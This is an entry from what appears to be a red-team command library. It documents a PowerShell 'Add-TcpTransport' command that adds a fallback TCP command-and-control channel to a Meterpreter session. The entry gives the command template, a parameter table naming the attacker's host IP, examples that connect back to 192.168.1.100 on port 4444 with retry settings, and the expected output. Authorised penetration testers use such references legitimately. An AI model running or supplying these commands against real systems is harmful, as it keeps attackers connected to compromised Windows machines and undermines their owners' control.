---
id: b1ac4382-fcc8-4501-9414-b690422d59b0
name: add-tcp-transport-to-meterpreter
type: command
executor: powershell
data: >-
  Add-TcpTransport -lhost $_LHOST -lport $_LPORT -RetryWait $_RETRY_WAIT
  -RetryTotal $_RETRY_TOTAL
output: null
created_at: '2023-04-06T03:56:21.692424+00:00'
updated_at: '2023-04-10T20:24:56.696544+00:00'
platforms:
  - Windows
tags:
  - metasploit
  - c2-transport
verified: true
validated: true
---

# add-tcp-transport-to-meterpreter

## Command

```powershell
Add-TcpTransport -lhost $_LHOST -lport $_LPORT -RetryWait $_RETRY_WAIT -RetryTotal $_RETRY_TOTAL
```

## Description

This PowerShell command, run within a Meterpreter session or via extinit, adds a TCP transport channel to the current session with configurable retry parameters. It ensures reliable fallback connectivity if the primary channel is disrupted.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -lhost $_LHOST | Attacker's host IP for TCP connection | Yes |
| -lport $_LPORT | Port for the TCP transport | Yes |
| -RetryWait $_RETRY_WAIT | Seconds to wait between retry attempts (default 10) | No |
| -RetryTotal $_RETRY_TOTAL | Total number of retry attempts (default 30) | No |

## Examples

### Basic Usage

```powershell
Add-TcpTransport -lhost 192.168.1.100 -lport 4444 -RetryWait 10 -RetryTotal 30
```

### Advanced Usage

For longer retries:
```powershell
Add-TcpTransport -lhost 192.168.1.100 -lport 4444 -RetryWait 5 -RetryTotal 60
```

## Expected Output

[*] Adding TCP transport: 192.168.1.100:4444
[*] Transport added successfully with retries configured.

No errors; the session now lists the new transport via `transport` command.

## Related

- [[procedures/Metasploit-Multiple-Transports-Payload-Generator]]
- [[commands/add-web-transport-to-meterpreter]]
